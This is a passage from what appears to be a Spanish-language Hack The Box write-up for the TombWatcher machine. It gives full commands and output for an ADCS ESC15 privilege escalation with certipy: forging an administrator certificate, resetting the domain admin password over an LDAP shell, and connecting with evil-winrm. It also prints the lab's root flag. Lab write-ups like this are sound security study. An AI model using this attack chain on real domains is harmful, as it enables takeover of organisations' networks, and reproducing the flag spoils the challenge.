                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

[info ESC15 - 1](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/)
[info ESC15 - 2](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

Vamos a necesitar para utilizar certipy el SID del usuario Administrator:

```bash
Get-ADUser -Identity Administrator | Select-Object SID

SID
---
S-1-5-21-1392491010-1358638721-2126982587-500
```
* Solicitamos el certificado como cert_admin

```bash
certipy-ad req -dc-ip 10.10.11.72 -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -target-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

* Nos conectamos al shell ldap y cambiamos el password del usuario administrator

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# change_password administrator Password123!
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Password123!
Password changed successfully!

# 
```

* Nos conectamos como administrator con evilwinrm

```bash
evil-winrm -i 10.10.11.72 -u administrator -p 'Password123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
afaad4dc30de8a7621ec8ca9d4a82f16
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
